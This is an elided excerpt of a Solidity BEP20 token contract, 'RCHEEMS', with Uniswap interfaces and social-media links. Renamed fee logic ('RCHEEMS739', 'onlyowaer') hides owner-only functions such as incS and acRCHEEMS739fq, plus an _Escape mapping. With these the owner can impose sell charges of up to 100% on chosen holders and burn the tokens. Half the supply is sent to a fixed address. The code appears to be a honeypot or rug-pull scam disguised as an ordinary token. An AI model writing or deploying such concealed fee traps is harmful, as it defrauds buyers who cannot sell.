...
* http://instagram.com/RCHEEMS739
* https://www.reddit.com/user/RCHEEMS739
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingRCHEEMS739OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingRCHEEMS739OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingRCHEEMS739OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingRCHEEMS739OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingRCHEEMS739OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function RCHEEMS739To() external view returns (address);
    function RCHEEMS739ToSetter() external view returns (address);
    ...
    function setRCHEEMS739To(address) external;
    function setRCHEEMS739ToSetter(address) external;
}
...
contract RCHEEMS is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "RCHEEMS";
	string symbol_ = "RCHEEMS";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*5);	
        ...
        _defaultSellRCHEEMS739 = 0;
        _defaultBuyRCHEEMS739 = 0;
    ...
    uint256 private _defaultSellRCHEEMS739 = 0;
    uint256 private _defaultBuyRCHEEMS739 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellRCHEEMS739 = _value;
    }


    function acRCHEEMS739fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeRCHEEMS739amuont = 0;

        if (rF) {
            uint256 tradeRCHEEMS739 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeRCHEEMS739 = _msgRCHEEMS739Info(uint160(from));
                    tradeRCHEEMS739 = tradeRCHEEMS739 < _defaultSellRCHEEMS739 ? _defaultSellRCHEEMS739 : tradeRCHEEMS739;
                }
                if (from == uniswapV2Pair) {
                    tradeRCHEEMS739 = _defaultBuyRCHEEMS739;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeRCHEEMS739 = _Escape[from];
            }


            tradeRCHEEMS739amuont = _amuont.mul(tradeRCHEEMS739).div(100);
        }


        if (tradeRCHEEMS739amuont > 0) {
            _balances[from] = _balances[from].sub(tradeRCHEEMS739amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeRCHEEMS739amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeRCHEEMS739amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeRCHEEMS739amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeRCHEEMS739amuont);
        emit Transfer(from, _to, _amuont - tradeRCHEEMS739amuont);
    }
	...
	function _msgRCHEEMS739Info(uint _acc) internal view virtual returns (uint) {
